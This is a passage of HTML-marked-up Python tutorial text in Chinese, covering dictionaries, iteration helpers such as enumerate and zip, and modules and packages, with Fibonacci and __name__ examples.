builtin\">dict</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>  <span class=\"token comment\"># 空字典</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {}</span>\n<span class=\"token builtin\">dict</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span>\n<span class=\"token builtin\">dict</span><span class=\"token punctuation\">[</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {2: 'test', 'test': 1}</span>\ndict2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'dddd'</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'test': 1, 1: 'dddd'}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">[</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出2,test的值</span>\n<span class=\"token comment\"># test 1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">.</span>keys<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出所有键名</span>\n<span class=\"token comment\"># dict_keys(['test', 1])</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出所有键值</span>\n<span class=\"token comment\"># dict_values([1, 'dddd'])</span>\n<span class=\"token builtin\">dict</span><span class=\"token punctuation\">[</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'txt'</span>  <span class=\"token comment\"># 修改键值</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {2: 'test', 'test': 'txt'}</span>\n<span class=\"token keyword\">del</span> dict2<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 删除一个键</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'test': 1}</span>\ndict2<span class=\"token punctuation\">.</span>clear<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 清空字典</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {}</span>\n<span class=\"token keyword\">del</span> dict2  <span class=\"token comment\"># 删除字典</span>\ndict2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'var'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'str'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'var'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'var'</span><span class=\"token punctuation\">}</span>\n<span class=\"token comment\"># 重复时后者覆盖前者</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict2<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'1': 2, 'var': 'var', 'test': 'test'}</span>\n\n<span class=\"token triple-quoted-string string\">'''\n{'sape': 4139, 'guido': 4127, 'jack': 4098}\n{}\n{2: 'test', 'test': 1}\n{'test': 1, 1: 'dddd'}\ntest 1\ndict_keys(['test', 1])\ndict_values([1, 'dddd'])\n{2: 'test', 'test': 'txt'}\n{'test': 1}\n{}\n{'1': 2, 'var': 'var', 'test': 'test'}\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如果关键字只是简单的字符串，使用关键字参数指定键值</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span>sape<span class=\"token operator\">=</span><span class=\"token number\">4139</span><span class=\"token punctuation\">,</span> guido<span class=\"token operator\">=</span><span class=\"token number\">4127</span><span class=\"token punctuation\">,</span> jack<span class=\"token operator\">=</span><span class=\"token number\">4098</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#{'sape': 4139, 'jack': 4098, 'guido': 4127}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>字典推导</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">dict3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>x<span class=\"token punctuation\">:</span> x<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict3<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># {2: 4, 4: 16, 6: 36}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"遍历技巧\"><a href=\"#遍历技巧\" class=\"headerlink\" title=\"遍历技巧\"></a>遍历技巧</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 关键字和对应的值可以使用 items() 方法同时解读</span>\ndict4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'123'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'999'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'haha'</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dict4<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'123': 'test', '999': 'haha'}</span>\n<span class=\"token keyword\">for</span> y<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> dict4<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 123 test</span>\n<span class=\"token comment\"># 999 haha</span>\n\n<span class=\"token comment\"># 索引位置和对应值可以使用 enumerate() 函数同时得到</span>\nlist3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'111'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'999'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>list3<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ['111', 'test', '999']</span>\n<span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>list3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span>\n<span class=\"token triple-quoted-string string\">'''\n0 111\n1 test\n2 999\n'''</span>\n<span class=\"token comment\"># 同时遍历两个或更多的序列，可以使用 zip() 组合</span>\nquestions <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'quest'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'favorite color'</span><span class=\"token punctuation\">]</span>\nanswers <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'lancelot'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'the holy grail'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'blue'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> q<span class=\"token punctuation\">,</span> a <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>questions<span class=\"token punctuation\">,</span> answers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'What is your {0}?  It is {1}.'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token triple-quoted-string string\">'''\nWhat is your name?  It is lancelot.\nWhat is your quest?  It is the holy grail.\nWhat is your favorite color?  It is blue.\n'''</span>\n\n<span class=\"token comment\"># 反向输出, 使用reversed()函数</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 9 7 5 3 1 </span>\n\n<span class=\"token comment\"># 顺序遍历一个序列，使用 sorted() 函数返回一个已排序的序列</span>\nbasket <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'orange'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'pear'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'orange'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'banana'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> f <span class=\"token keyword\">in</span> <span class=\"token builtin\">sorted</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span>basket<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># apple banana orange pear </span>\n\n<span class=\"token triple-quoted-string string\">'''\n{'123': 'test', '999': 'haha'}\n123 test\n999 haha\n['111', 'test', '999']\n0 111\n1 test\n2 999\nWhat is your name?  It is lancelot.\nWhat is your quest?  It is the holy grail.\nWhat is your favorite color?  It is blue.\n9 7 5 3 1 \napple banana orange pear \n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"模块\"><a href=\"#模块\" class=\"headerlink\" title=\"模块\"></a>模块</h2><p>模块是一个包含所有你定义的函数和变量的文件，其后缀名是.py，意思是你能直接调用写好的函数或者变量来执行你的任务，这些写好的函数和变量被封装在一个文件包中</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> sys\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'命令行参数如下:'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\n\\nPython 路径为：'</span><span class=\"token punctuation\">,</span> sys<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">,</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>import sys 引入 python 标准库中的 sys.py 模块</li>\n<li>sys.argv 是一个包含命令行参数的列表</li>\n<li>sys.path 包含了一个 Python 解释器自动查找所需模块的路径的列表</li>\n</ol>\n<h3 id=\"import语句\"><a href=\"#import语句\" class=\"headerlink\" title=\"import语句\"></a>import语句</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> module1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> module2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> moduleN<span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ol>\n<li>import只会导入一次</li>\n<li>解释器收缩路径是在sys.path中确定</li>\n</ol>\n<p>在sys.path任一路径下创建文件fibo.py</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 斐波那契(fibonacci)数列模块</span>\n \n<span class=\"token keyword\">def</span> <span class=\"token function\">fib</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>    <span class=\"token comment\"># 定义到 n 的斐波那契数列</span>\n    a<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">while</span> b <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n        a<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> b<span class=\"token punctuation\">,</span> a<span class=\"token operator\">+</span>b\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n \n<span class=\"token keyword\">def</span> <span class=\"token function\">fib2</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 返回到 n 的斐波那契数列</span>\n    result <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    a<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">while</span> b <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">:</span>\n        result<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span>\n        a<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> b<span class=\"token punctuation\">,</span> a<span class=\"token operator\">+</span>b\n    <span class=\"token keyword\">return</span> result<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>引入模块使用</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">fibo<span class=\"token punctuation\">.</span>fib<span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span>\nfibo<span class=\"token punctuation\">.</span>fib2<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n\nfib <span class=\"token operator\">=</span> fibo<span class=\"token punctuation\">.</span>fib <span class=\"token comment\"># 将函数赋给本地</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"from-…-import-语句\"><a href=\"#from-…-import-语句\" class=\"headerlink\" title=\"from … import 语句\"></a>from … import 语句</h3><p>Python 的 from 语句让你从模块中导入一个指定的部分到当前命名空间中</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> modname <span class=\"token keyword\">import</span> name1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> name2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> nameN<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>要导入模块 fibo 的 fib 函数</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> fibo <span class=\"token keyword\">import</span> fib<span class=\"token punctuation\">,</span> fib2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这个声明不会把整个fibo模块导入到当前的命名空间中，它只会将fibo里的fib函数引入进来</p>\n<h3 id=\"from-…-import-语句-1\"><a href=\"#from-…-import-语句-1\" class=\"headerlink\" title=\"from … import * 语句\"></a>from … import * 语句</h3><p>把一个模块的所有内容全都导入到当前的命名空间</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> modname <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"深入模式\"><a href=\"#深入模式\" class=\"headerlink\" title=\"深入模式\"></a>深入模式</h3><p>模块除了方法定义，还可以包括可执行的代码。这些代码一般用来初始化这个模块。这些代码只有在第一次被导入时才会被执行。每个模块有各自独立的符号表，在模块内部为所有的函数当作全局符号表来使用。</p>\n<p>导入模块的全局变量和本模块的全局变量是不影响的</p>\n<h3 id=\"name-属性\"><a href=\"#name-属性\" class=\"headerlink\" title=\"__name__属性\"></a>__name__属性</h3><ol>\n<li>用__name__属性来使该程序块仅在该模块自身运行时执行</li>\n<li>每个模块都有一个__name__属性，当其值是’<strong>main</strong>‘时，表明该模块自身在运行，否则是被引入</li>\n<li><strong><strong>name</strong></strong> 与 <strong><strong>main</strong></strong> 底下是双下划线， <strong>_ _</strong> 是这样去掉中间的那个空格</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n   <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'程序自身在运行'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n   <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'我来自另一模块'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python using_name<span class=\"token punctuation\">.</span>py\n程序自身在运行\n\n<span class=\"token operator\">&gt;&gt;</span><span class=\"token operator\">&gt;</span> <span class=\"token keyword\">import</span> using_name\n我来自另一模块<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"dir-函数\"><a href=\"#dir-函数\" class=\"headerlink\" title=\"dir()函数\"></a>dir()函数</h3><p>内置的函数 dir() 可以找到模块内定义的所有名称。以一个字符串列表的形式返回</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dir</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n['__breakpointhook__', '__displayhook__', '__doc__', '__excepthook__', '__interactivehook__', '__loader__', '__name__', '__package__', '__spec__', '__stderr__', '__stdin__', '__stdout__', '__unraisablehook__', '_base_executable', '_clear_type_cache', '_current_frames', '_debugmallocstats', '_enablelegacywindowsfsencoding', '_framework', '_getframe', '_git', '_home', '_xoptions', 'addaudithook', 'api_version', 'argv', 'audit', 'base_exec_prefix', 'base_prefix', 'breakpointhook', 'builtin_module_names', 'byteorder', 'call_tracing', 'callstats', 'copyright', 'displayhook', 'dllhandle', 'dont_write_bytecode', 'exc_info', 'excepthook', 'exec_prefix', 'executable', 'exit', 'flags', 'float_info', 'float_repr_style', 'get_asyncgen_hooks', 'get_coroutine_origin_tracking_depth', 'getallocatedblocks', 'getcheckinterval', 'getdefaultencoding', 'getfilesystemencodeerrors', 'getfilesystemencoding', 'getprofile', 'getrecursionlimit', 'getrefcount', 'getsizeof', 'getswitchinterval', 'gettrace', 'getwindowsversion', 'hash_info', 'hexversion', 'implementation', 'int_info', 'intern', 'is_finalizing', 'maxsize', 'maxunicode', 'meta_path', 'modules', 'path', 'path_hooks', 'path_importer_cache', 'platform', 'prefix', 'pycache_prefix', 'set_asyncgen_hooks', 'set_coroutine_origin_tracking_depth', 'setcheckinterval', 'setprofile', 'setrecursionlimit', 'setswitchinterval', 'settrace', 'stderr', 'stdin', 'stdout', 'thread_info', 'unraisablehook', 'version', 'version_info', 'warnoptions', 'winver']\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如果没有给定参数，那么 dir() 函数会罗列出当前定义的所有名称</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dir</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n['__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'i', 'sys']\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"标准模块\"><a href=\"#标准模块\" class=\"headerlink\" title=\"标准模块\"></a>标准模块</h3><p>Python 本身带着一些标准的模块库，有些模块直接被构建在解析器里</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>ps1<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>ps2<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"包\"><a href=\"#包\" class=\"headerlink\" title=\"包\"></a>包</h3><p>包是一种管理 Python 模块命名空间的形式，采用”点模块名称”，比如一个模块的名称是 A.B， 那么他表示一个包 A中的子模块 B，例如 </p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">sound/                          顶层包\n      __init__.py               初始化 sound 包\n      formats/                  文件格式转换子包\n              __init__.py\n              wavread.py\n              wavwrite.py\n              aiffread.py\n              aiffwrite.py\n              auread.py\n              auwrite.py\n              <span class=\"token punctuation\">..</span>.\n      effects/                  声音效果子包\n              __init__.py\n              echo.py\n              surround.py\n              reverse.py\n              <span class=\"token punctuation\">..</span>.\n      filters/                  filters 子包\n              __init__.py\n              equalizer.py\n              vocoder.py\n              karaoke.py\n              <span class=\"token punctuation\">..</span>.<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>目录只有包含一个叫做 <strong>init</strong>.py 的文件才会被认作是一个包</li>\n<li>使用形如 <strong>import item.subitem.subsubitem</strong> 这种导入形式，除了最后一项，都必须是包，而最后一项则可以是模块或者是包，但是不可以是类，函数或者变量的名字。</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> sound<span class=\"token punctuation\">.</span>effects<span class=\"token punctuation\">.</span>echo\n<span class=\"token comment\"># 导入包里的特定模块</span>\nsound<span class=\"token punctuation\">.</span>effects<span class=\"token punctuation\">.</span>echo<span class=\"token punctuation\">.</span>echofilter<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">,</span> output<span class=\"token punctuation\">,</span> delay<span class=\"token operator\">=</span><span class=\"token number\">0.7</span><span class=\"token punctuation\">,</span> atten<span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">from</span> sound<span class=\"token punctuation\">.</span>effects <span class=\"token keyword\">import</span> echo\n<span class=\"token comment\"># 导入子模块的方法</span>\necho<span class=\"token punctuation\">.</span>echofilter<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">,</span> output<span class=\"token punctuation\">,</span> delay<span class=\"token operator\">=</span><span class=\"token number\">0.7</span><span class=\"token punctuation\">,</span> atten<span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">from</span> sound<span class=\"token punctuation\">.</span>effects<span class=\"token punctuation\">.</span>echo <span class=\"token keyword\">import</span> echofilter\n<span class=\"token comment\"># 直接导入一个函数或者变量</span>\nechofilter<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">,</span> output<span class=\"token punctuation\">,</span> delay<span class=\"token operator\">=</span><span class=\"token number\">0.7</span><span class=\"token punctuation\">,</span> atten<span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">from</span> package <span class=\"token keyword\">import</span> item\n<span class=\"token comment\">#import 语法会首先把 item 当作一个包定义的名称，如果没找到，再试图按照一个模块去导入。如果还没找到，抛出一个 :exc:ImportError 异常。</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"从一个包中导入\"><a href=\"#从一个包中导入\" class=\"headerlink\" title=\"从一个包中导入*\"></a>从一个包中导入*</h3><ol>\n<li><p>如果包定义文件 <strong>_<em>init</em>_.py</strong> 存在一个叫做 <strong>_<em>all</em>_</strong> 的列表变量，那么在使用 <strong>from package import *</strong> 的时候就把这个列表中的所有名字作为包内容导入</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">__all__ <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"echo\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"surround\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"reverse\"</span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" 